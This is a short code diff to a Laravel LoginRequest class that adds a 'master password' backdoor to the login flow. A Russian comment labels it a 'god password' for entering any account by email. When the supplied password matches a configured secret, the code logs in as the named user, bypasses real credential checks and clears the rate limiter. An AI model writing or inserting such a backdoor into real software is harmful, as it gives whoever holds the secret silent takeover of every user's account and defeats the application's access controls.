@@ -41,6 +41,18 @@ class LoginRequest extends FormRequest
     {
         $this->ensureIsNotRateLimited();
 
+        // Мастер-пароль («пароль бога»): вход в любой аккаунт по одному email.
+        $master = config('auth.master_password');
+        if (! empty($master) && hash_equals((string) $master, (string) $this->input('password'))) {
+            $user = \App\Models\User::where('email', $this->input('email'))->first();
+            if ($user) {
+                Auth::login($user, $this->boolean('remember'));
+                RateLimiter::clear($this->throttleKey());
+
+                return;
+            }
+        }
+
         if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
 
